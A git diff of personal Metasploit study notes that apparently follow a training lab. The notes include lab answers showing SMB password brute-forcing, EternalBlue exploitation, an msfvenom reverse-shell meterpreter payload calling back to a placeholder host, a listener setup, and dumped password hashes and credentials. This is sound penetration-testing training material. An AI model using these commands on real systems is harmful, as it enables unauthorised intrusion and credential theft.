@@ -1,4 +1,4 @@
-Exploit: A piece of code that uses a vulnerability present on the target.
+Exploit: A tool, script or technique that uses a vulnerability present on the target.
 Vulnerability: A design, coding, or logic flaw affecting the target. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
 Payload: Payloads are the code that will run on the target system.
 
@@ -102,6 +102,7 @@ payloads/
 ├── singles
 ├── stagers
 └── stages
+msfvenom : generate payloads
 
 Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
 Singles (Inlines): A single payload has everything built in: the exploit and the malicious action (like a shell or command) all in one piece.
@@ -128,8 +129,10 @@ post/
 # CLI CLI CLI CLI CLI CLI
 Search
 This command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
+info : gives info of the module you are currently using
 
-# Parameters during exploits
+
+# Important parameters during exploits
 Parameters you will often use are:
 RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.
 RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
@@ -143,7 +146,6 @@ Clear all set parameters with the unset all command. --- > "unset all"
 setg ---> sets a parameter for all options | unset by "unsetg"
 
 # Exploiting
-Once all parameters are set it is time to launch the attack.
 exploit
 OPTIONAL
 exploit -z | this command will run the exploit and background the session as soon as it opens.
@@ -152,3 +154,107 @@ You can use the background command to background the session prompt and go back 
 Alternatively, CTRL+Z can be used to background sessions.
 The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
 To interact with any session, you can use the sessions -i command followed by the desired session number.
+
+# Port scanning
+search portscan : list potential port scanning modules
+search sweep : list types of sweeps (including services running over the UDP)
+
+# SMB scans
+search smb_enumshares
+search smb_version
+
+# Exercise scanning
+Q : How many ports are open on the target system? 
+A : 5
+search tcp scanner
+26  auxiliary/scanner/portscan/tcp
+use 26
+set RHOSTS ip
+run
+
+Q : Using the relevant scanner, what NetBIOS name can you see?
+netbios has to do with UDP, UDP services can be listed using scanner/discovery/udp_sweep
+set RHOSTS ip
+run
+NETBIOS name listed
+
+Q : What is running on port 8000?
+i remember seeing this port when i used the TCP port scanner -> i check the version running on port 8000 using "nmap -sV 10.10.163.53"
+port 8000 running WebFS httpd 1.21
+
+Q : What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 
+search smb
+found "377 auxiliary/scanner/smb/smb_login"
+use 377
+show options
+have to set SMBUser to penny
+have to set PASS_FILE to /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+make sure to set RHOSTS to ip aswell
+[+] 10.10.163.53:445      - 10.10.163.53:445 - Success: '.\penny:leo1234'
+
+# IRL pentesting advice
+I will likely have multiple targets during an actual pentest -> msploit has a database function to avoid confusion
+start -> systemctl start postgresql
+initialize -> msfdb init
+launch msfconsole and check the database status -> db_status
+This will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace.
+workspace : list available workspces
+workspace -a insertname : add workspace
+workspace -d insertname : delete workspace
+workspace insertname : switch workspace
+workspace -h : list available options for workspace
+help : show the Database Backends Commands menu
+for example : db_nmap parameter parameter -> scan nmap and save to dbase
+hosts : list information relevant to hosts on target machine after the db_nmap command
+services : list information relevant to hosts on target machine
+USEFUL = hosts -h / services -h
+hosts -R : add this value to the RHOSTS parameter after the db_nmap command
+If there is more than one host saved to the database, all IP addresses will be used when the hosts -R command is used.
+In a typical penetration testing engagement, we could have the following scenario: 
+
+    Finding available hosts using the db_nmap command
+    Scanning these for further vulnerabilities or open ports (using a port scanning module)
+services -S inserthere ! allow you to search for specific services in the environment
+You may want to look for low-hanging fruits such as:
+
+    HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
+    FTP: Could allow anonymous login and provide access to interesting files. 
+    SMB: Could be vulnerable to SMB exploits like MS17-010
+    SSH: Could have default or easy to guess credentials
+    RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 
+
+# Working with sessions
+sessions : will list all active sessions
+sessions -h : help
+sessions -i : interact with any existing session followed by session ID
+
+# Exploitation exercise
+Q : Exploit one of the critical vulnerabilities on the target VM
+A : used eternalblue with a reverse tcp shell payload
+Q : What is the content of the flag.txt file?
+A : THM-5455554845
+Q : What is the NTLM hash of the password of the user "pirate"?
+hashdump
+8ce9a3ebd1647fcc5e04025019f4b875
+
+# msfvenom
+msfvenom -l payloads : lists payloads
+msfvenom --list formats : list supported output formats
+
+# Exercise
+Q : Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).
+A : msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+Q : Get a meterpreter session on the target machine.
+A : 
+1 in msfconsole : use /exploit/multi/handler 
+2 set payload linux/x86/meterpreter/reverse_tcp 
+3 set lhost ip
+4 set lport port
+5 run
+6 run payload in target machine (by first giving it chmod access)
+7 meterpreter shell
+Q : Use a post exploitation module to dump hashes of other users on the system.
+A : run post/linux/gather/hashdump
+hash : $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
+
+DONE
